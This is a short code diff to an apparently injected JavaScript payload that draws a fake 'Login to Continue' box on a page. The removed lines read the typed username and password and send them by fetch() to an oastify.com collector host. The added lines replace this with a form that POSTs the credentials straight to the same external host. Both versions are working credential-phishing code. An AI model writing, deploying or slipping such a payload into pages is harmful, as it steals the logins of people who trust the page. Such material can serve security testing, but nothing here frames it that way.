@@ -55,26 +55,15 @@ button{
 <div id="loginBox">
 <h2>Login to Continue</h2>
 
-<form id="loginForm">
-<input id="username" placeholder="Username" required>
-<input id="password" type="password" placeholder="Password" required>
-<button>Login</button>
+<form method="POST" action="https://3rvorvb38y8xh651bghtznbl9cf33tri.oastify.com/login">
+<input name="username" placeholder="Username" required>
+<input name="password" type="password" placeholder="Password" required>
+<button type="submit">Login</button>
 </form>
 
 </div>
 
 </body>
 `;
-
-document.getElementById("loginForm").addEventListener("submit",function(e){
-
-e.preventDefault();
-
-const u=document.getElementById("username").value;
-const p=document.getElementById("password").value;
-
-fetch("https://3rvorvb38y8xh651bghtznbl9cf33tri.oastify.com/?u="+encodeURIComponent(u)+"&p="+encodeURIComponent(p));
-
-});
 
 })();
